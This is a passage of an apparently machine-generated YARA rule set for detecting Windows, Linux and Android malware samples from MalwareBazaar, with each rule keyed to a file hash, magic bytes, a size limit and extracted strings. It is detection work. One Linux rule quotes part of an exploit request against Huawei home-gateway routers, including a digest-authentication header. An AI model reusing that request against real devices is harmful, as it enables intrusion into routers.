        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 778KB
        and all of them
}

rule Windows_bc7c7280855c384e5a970a2895363bd5c8db9088977d129b180d3acb1ec9148a
{
    meta:
        description = "Auto ML: bc7c7280855c384e5a970a2895363bd5c8db9088977d129b180d3acb1ec9148a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = ".rdata"
        $s4 = "@.pdata"
        $s5 = "@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 715KB
        and all of them
}

rule Windows_bc822ed934731c6843e138a7b5a0f643b6852ee233b0fb861040bd95111d09f5
{
    meta:
        description = "Auto ML: bc822ed934731c6843e138a7b5a0f643b6852ee233b0fb861040bd95111d09f5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SVWuH3"
        $s5 = "uBhr4@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 239KB
        and all of them
}

rule Windows_bca1b830105b7ffeae00fea5f3a993586d0b85e9e3ef21db6c71757f2ad32dab
{
    meta:
        description = "Auto ML: bca1b830105b7ffeae00fea5f3a993586d0b85e9e3ef21db6c71757f2ad32dab"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "p|QRjn"
        $s5 = "L$Tj j"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2429KB
        and all of them
}

rule Windows_bcb2d451f4dfa2303bee79a0ad6b2f060ae508ab7cdd92e6d3f718baf297fca8
{
    meta:
        description = "Auto ML: bcb2d451f4dfa2303bee79a0ad6b2f060ae508ab7cdd92e6d3f718baf297fca8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "? IQz6S"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2316KB
        and all of them
}

rule Windows_bcec8f25d0fcce6b453b9bc363d15b3fa84f2bca0afc7c5bb9f3620386b4dabc
{
    meta:
        description = "Auto ML: bcec8f25d0fcce6b453b9bc363d15b3fa84f2bca0afc7c5bb9f3620386b4dabc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2418KB
        and all of them
}

rule Windows_bd2b3bc973155b2f6b0866245d933619550d127f292cb912e9cea106fb8392a5
{
    meta:
        description = "Auto ML: bd2b3bc973155b2f6b0866245d933619550d127f292cb912e9cea106fb8392a5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0SSSSS"
        $s5 = "QQSVWh"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 817KB
        and all of them
}

rule Windows_bd700d29a293140025aab849bec3b4ecb2fa67574f7efd2ed1dfb19aee3286ea
{
    meta:
        description = "Auto ML: bd700d29a293140025aab849bec3b4ecb2fa67574f7efd2ed1dfb19aee3286ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "G:CvfV"
        $s3 = "\\,VTbm"
        $s4 = "k%jPJo"
        $s5 = "s.f}db"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 600KB
        and all of them
}

rule Windows_bd8646691e2eb4e3467861fc765cfc3a45925243afac513944a922a1100d80bb
{
    meta:
        description = "Auto ML: bd8646691e2eb4e3467861fc765cfc3a45925243afac513944a922a1100d80bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "v|hT`C"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 239KB
        and all of them
}

rule Windows_137d46e5525f910e8a9b13f184fb28c918cccf097d3342a3208db85eb3146554
{
    meta:
        description = "Auto ML: 137d46e5525f910e8a9b13f184fb28c918cccf097d3342a3208db85eb3146554"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 159KB
        and all of them
}

rule Android_bdb84b702752c4065fa36f7c6f7038eed2bfda6d09c32d69512896077b66c097
{
    meta:
        description = "Auto ML: bdb84b702752c4065fa36f7c6f7038eed2bfda6d09c32d69512896077b66c097"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "assets/arctic.attheme}Z]s"
        $s2 = "^F+kSa"
        $s3 = "-elvI>"
        $s4 = ";t!HxT"
        $s5 = "#WM1tM"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 77173KB
        and all of them
}

rule Windows_bdd18149da8dd36475433df59529ff1159969bb23aa34274e9a114e2979dfdc8
{
    meta:
        description = "Auto ML: bdd18149da8dd36475433df59529ff1159969bb23aa34274e9a114e2979dfdc8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "a -]FVX"
        $s4 = "q !h<qX"
        $s5 = "PT~X g"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2797KB
        and all of them
}

rule Linux_bdd2e6994710acc35676b7e8a0fae06759995604314527eed6692cb331b19402
{
    meta:
        description = "Auto ML: bdd2e6994710acc35676b7e8a0fae06759995604314527eed6692cb331b19402"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ";|$(t:WWj"
        $s2 = ";|$(t:PPj"
        $s3 = "C)QQWP"
        $s4 = "D$(XZj"
        $s5 = "D$$PSV"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 70KB
        and all of them
}

rule Windows_bdda2e25de8ae0b35633c5a8648a58d074220327c4f40909ea30519049b868b0
{
    meta:
        description = "Auto ML: bdda2e25de8ae0b35633c5a8648a58d074220327c4f40909ea30519049b868b0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich<>"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".didat"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1783KB
        and all of them
}

rule Windows_bdf867eab65bb30f2cbe508eecbafb5f7da83a4f0e435490cf0b9bcc8b024860
{
    meta:
        description = "Auto ML: bdf867eab65bb30f2cbe508eecbafb5f7da83a4f0e435490cf0b9bcc8b024860"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "uRFGHt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1420KB
        and all of them
}

rule Windows_be0bf3020e394c001a0b1754ca7e3d708e5973b2bff748c033a14de047cfb9f8
{
    meta:
        description = "Auto ML: be0bf3020e394c001a0b1754ca7e3d708e5973b2bff748c033a14de047cfb9f8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "d UUUU_`"
        $s5 = "lZ[YZ*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2460KB
        and all of them
}

rule Linux_be36029eb1545971fda31a593cfcd69f2ff196d207369da6df8bb20e8422055f
{
    meta:
        description = "Auto ML: be36029eb1545971fda31a593cfcd69f2ff196d207369da6df8bb20e8422055f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/Vy|hL"
        $s2 = "KZP(m*3"
        $s3 = "1qqIC("
        $s4 = "NT-\\+von"
        $s5 = "HSy/he"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 36KB
        and all of them
}

rule Windows_bea42a753715b080ac6a74256cd563aef533f837b9dd45797d50c99d2af989fd
{
    meta:
        description = "Auto ML: bea42a753715b080ac6a74256cd563aef533f837b9dd45797d50c99d2af989fd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "CompilationRelaxationsAttribute"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 857KB
        and all of them
}

rule Windows_bea78cbf3ffb7847e8780d12db07b647e3af5af304c4bcef95d9e73e310d47bd
{
    meta:
        description = "Auto ML: bea78cbf3ffb7847e8780d12db07b647e3af5af304c4bcef95d9e73e310d47bd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "t(ENEN;"
        $s5 = "D$4SUV"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 936KB
        and all of them
}

rule Linux_beeeb0302fcd47e3a607cac174494ae538e6130680d2e76d09f7b0f376ec1bda
{
    meta:
        description = "Auto ML: beeeb0302fcd47e3a607cac174494ae538e6130680d2e76d09f7b0f376ec1bda"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AUATSH"
        $s2 = "[]A\\A]A^A_"
        $s3 = "AVAUATS"
        $s4 = "X[A\\A]A^"
        $s5 = "AWAVAUATUH"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 115KB
        and all of them
}

rule Windows_13b674ae0e3c7fceb57574b0b8fcd7060c4a1c553f841136d1c7d5bf09d1685e
{
    meta:
        description = "Auto ML: 13b674ae0e3c7fceb57574b0b8fcd7060c4a1c553f841136d1c7d5bf09d1685e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_bf1b72b0469fe09e9e544ec62774f07d6c568aadb8aecbdbefe8b35d8e586c55
{
    meta:
        description = "Auto ML: bf1b72b0469fe09e9e544ec62774f07d6c568aadb8aecbdbefe8b35d8e586c55"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "Instu`"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 653KB
        and all of them
}

rule Windows_bf35fe6ed1dbd9f9594695e2ca5bd3d5f5b2706461ddc8f29344849a03c74008
{
    meta:
        description = "Auto ML: bf35fe6ed1dbd9f9594695e2ca5bd3d5f5b2706461ddc8f29344849a03c74008"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "RichlY"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".pesezu"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 357KB
        and all of them
}

rule Linux_bfbfc3315e8cba29119839fbc46d44e55eadad78979b16fc6501fce1a458863e
{
    meta:
        description = "Auto ML: bfbfc3315e8cba29119839fbc46d44e55eadad78979b16fc6501fce1a458863e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "x}d[x}%KxK"
        $s2 = "x}%KxH"
        $s3 = "}f[x}GSxH"
        $s4 = "x}'KxH"
        $s5 = "}CSx}d[x|"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 115KB
        and all of them
}

rule Windows_c0155a1de83ff4f2584bb2439c19ef0387633e85948c4b379696a5853177aeee
{
    meta:
        description = "Auto ML: c0155a1de83ff4f2584bb2439c19ef0387633e85948c4b379696a5853177aeee"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "G:CvfV"
        $s3 = "\\,VTbm"
        $s4 = "k%jPJo"
        $s5 = "s.f}db"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 263KB
        and all of them
}

rule Linux_c0566bccac1e2a5599971cef90b8279aa5c7e2a8d5e2e482165070c1065f3cca
{
    meta:
        description = "Auto ML: c0566bccac1e2a5599971cef90b8279aa5c7e2a8d5e2e482165070c1065f3cca"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "0NQj%m"
        $s2 = "$uMyQe"
        $s3 = ";e2MhdDNlJ"
        $s4 = "n$PH.Hw"
        $s5 = "pd[t$As"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 27KB
        and all of them
}

rule Linux_c0a1bcc2ab96bb85f36ecd7da63eb8e4f7cccdb63babab11d0fe76084abecec6
{
    meta:
        description = "Auto ML: c0a1bcc2ab96bb85f36ecd7da63eb8e4f7cccdb63babab11d0fe76084abecec6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $s2 = "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGH"
        $s3 = "IJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
        $s4 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS"
        $s5 = "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 86KB
        and all of them
}

rule Windows_c0bb486bdbe13bb82763950a923e16a697055bc6b7c5284bd8625d970732e7b0
{
    meta:
        description = "Auto ML: c0bb486bdbe13bb82763950a923e16a697055bc6b7c5284bd8625d970732e7b0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "j@htS@"
        $s5 = "SSjdWjdWh"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 27145KB
        and all of them
}

rule Windows_c0da527625e48ff867196f7d0cb29117d5a8db42d7f802604fd20eaffa2b8f4d
{
    meta:
        description = "Auto ML: c0da527625e48ff867196f7d0cb29117d5a8db42d7f802604fd20eaffa2b8f4d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "dQN `)Q"
        $s3 = "joO E+"
        $s4 = "Iyx>I+`\""
        $s5 = "bqr0Dq"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 397KB
        and all of them
}

rule Windows_c0dddd2f76868a1b8d473e03031f663cef750cb51941841d1efc38c3962785ce
{
    meta:
        description = "Auto ML: c0dddd2f76868a1b8d473e03031f663cef750cb51941841d1efc38c3962785ce"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6293KB
        and all of them
}

rule Linux_c0e125c31b9883cf738858419269387bfadbc533abcdbc4188787c5501d62335
{
    meta:
        description = "Auto ML: c0e125c31b9883cf738858419269387bfadbc533abcdbc4188787c5501d62335"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ";|$(t:WWj"
        $s2 = ";|$(t:PPj"
        $s3 = "toPPj/U"
        $s4 = "D$$PSV"
        $s5 = "E4tmPh8"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB
        and all of them
}

rule Windows_13e063bc39be5c694f3bb67deead2b8a4781d98a0c26cc2d8ec68e0a72726dc7
{
    meta:
        description = "Auto ML: 13e063bc39be5c694f3bb67deead2b8a4781d98a0c26cc2d8ec68e0a72726dc7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Require Windows"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "QQSVWh"
        $s5 = "hSVWj@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4050KB
        and all of them
}

rule Linux_c1046f2cfb6e4a7d2929fa7202c9b34cf58d355732c8d19d265dd2482e19219b
{
    meta:
        description = "Auto ML: c1046f2cfb6e4a7d2929fa7202c9b34cf58d355732c8d19d265dd2482e19219b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "D$TPh("
        $s2 = "xAPPSh"
        $s3 = "u%WWSS"
        $s4 = "t@;D$xu"
        $s5 = "T$8XZj"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 68KB
        and all of them
}

rule Windows_c124a4946fe5082a00d6cac5473ec09163f6c1c0720e47293bf1f2e8b28d44f2
{
    meta:
        description = "Auto ML: c124a4946fe5082a00d6cac5473ec09163f6c1c0720e47293bf1f2e8b28d44f2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1993KB
        and all of them
}

rule Windows_c125c422c6534f72a342ec54231c2caaff61cb2f649bb764913ff76e25705d4c
{
    meta:
        description = "Auto ML: c125c422c6534f72a342ec54231c2caaff61cb2f649bb764913ff76e25705d4c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1210KB
        and all of them
}

rule Linux_c1282be20f20826fb62d1716fd91e50b1c1e5a0b1f94d6259818ab0713fbd499
{
    meta:
        description = "Auto ML: c1282be20f20826fb62d1716fd91e50b1c1e5a0b1f94d6259818ab0713fbd499"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Content-Length: 430"
        $s3 = "Connection: keep-alive"
        $s4 = "Accept: */*"
        $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 90KB
        and all of them
}

rule Linux_c1712b191d346860f71a7e2f0eee19aa3d7823e7c5c8502b0481b8e8146f55b5
{
    meta:
        description = "Auto ML: c1712b191d346860f71a7e2f0eee19aa3d7823e7c5c8502b0481b8e8146f55b5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "eKfOvFe"
        $s2 = "wwoTii"
        $s3 = "'ojjbz"
        $s4 = "+i6C<mm"
        $s5 = "hK2SpA"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 62KB
        and all of them
}

rule Windows_c177812f5ee5c7643659dba85dcdb7d86134d2a437a8c7934c9b63eb3a5b4530
{
    meta:
        description = "Auto ML: c177812f5ee5c7643659dba85dcdb7d86134d2a437a8c7934c9b63eb3a5b4530"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADPf"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1152KB
        and all of them
}

rule Windows_c1a7adbef8fb6d94955cbae7dd0dd5c2778eb4cb45e56b73ccc772274bcb55da
{
    meta:
        description = "Auto ML: c1a7adbef8fb6d94955cbae7dd0dd5c2778eb4cb45e56b73ccc772274bcb55da"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "KDBM(k"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 96KB
        and all of them
}

rule Windows_c1be3c17f856344daf7ab2ad08074e94145f371698f52bc93b5dde4030c53f62
{
    meta:
        description = "Auto ML: c1be3c17f856344daf7ab2ad08074e94145f371698f52bc93b5dde4030c53f62"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "PSQRWV"
        $s5 = "VWPSQR"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 93KB
        and all of them
}

rule Linux_c21ccd8261803110629e535c9c193887c0f2aede33f22cd69b3d84b4b036bbb9
{
    meta:
        description = "Auto ML: c21ccd8261803110629e535c9c193887c0f2aede33f22cd69b3d84b4b036bbb9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "y$Qdl%"
        $s2 = "%od Nd"
        $s3 = "Sytm9$"
        $s4 = "xMxhYW"
        $s5 = "Uw+5pq"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB
        and all of them
}

rule Linux_c22955abd0961e17b9553bfe317f0d87ef909c953e3400532ee170fd9e1fdd08
{
    meta:
        description = "Auto ML: c22955abd0961e17b9553bfe317f0d87ef909c953e3400532ee170fd9e1fdd08"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "VUUUgfff"
        $s2 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 140KB
        and all of them
}

rule Windows_141262cbd24e43f4c8911c32896fe6c1f0f5e171e8e6e6bd26a24a7bfde0dcd0
{
    meta:
        description = "Auto ML: 141262cbd24e43f4c8911c32896fe6c1f0f5e171e8e6e6bd26a24a7bfde0dcd0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "uRFGHt"
        $s3 = "%co8FI"
        $s4 = "cQ(tS- ua"
        $s5 = "hg.@=hp"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 593KB
        and all of them
}

rule Windows_c22db1b22fbd99cd732c0f0ba23a223f686182f192f85e3ff2d9ed88d4554a8d
{
    meta:
        description = "Auto ML: c22db1b22fbd99cd732c0f0ba23a223f686182f192f85e3ff2d9ed88d4554a8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "G:CvfV"
        $s3 = "\\,VTbm"
        $s4 = "k%jPJo"
        $s5 = "s.f}db"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 277KB
        and all of them
}

rule Linux_c253c7a116d59836bb6bc7c097536dfc7ed17dce09e73d2958ef0a7b72fcdfed
{
    meta:
        description = "Auto ML: c253c7a116d59836bb6bc7c097536dfc7ed17dce09e73d2958ef0a7b72fcdfed"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ff4Jfg"
